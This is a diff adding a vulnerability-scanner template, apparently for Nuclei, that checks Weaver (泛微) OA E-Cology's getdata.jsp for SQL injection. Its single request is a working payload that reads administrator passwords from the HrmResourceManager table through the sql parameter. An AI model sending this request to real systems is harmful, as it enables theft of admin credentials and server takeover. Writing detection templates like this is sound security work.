@@ -1,0 +1,41 @@
+id: fanweiOA-E-Cology-getdata_jsp-sql-injection
+
+info:
+  name: 泛微OA E-Cology getdata.jsp SQL注入漏洞
+  author: cnaq
+  severity: high  
+  description: 泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限
+  reference: 
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20getdata.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  tags: sql,ecology,fanwei,oa
+
+
+requests:
+  - raw:
+      - |
+        GET /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and  
+    matchers:
+      # 漏洞返回页面无特征，使用过滤方式减少误报
+      # 基本条件1 响应状态
+      - type: status
+        status:
+          - 200
+      # 基本条件2 非跳转登录页面
+      - type: word
+        words:
+          - "Login.jsp"
+        part: body
+        negative: true
+      # 高级条件 过滤内容大小（非空白页面）
+      - type: dsl
+        dsl:
+          - 'len(body)>=32' # 可确认内容长度时可以用 'len(body)>=32&&len(body)<1024' 锁定范围
+      # 高级条件 内容必有的单字符
+      - type: word
+        part: body
+        words:
+          - ','
+
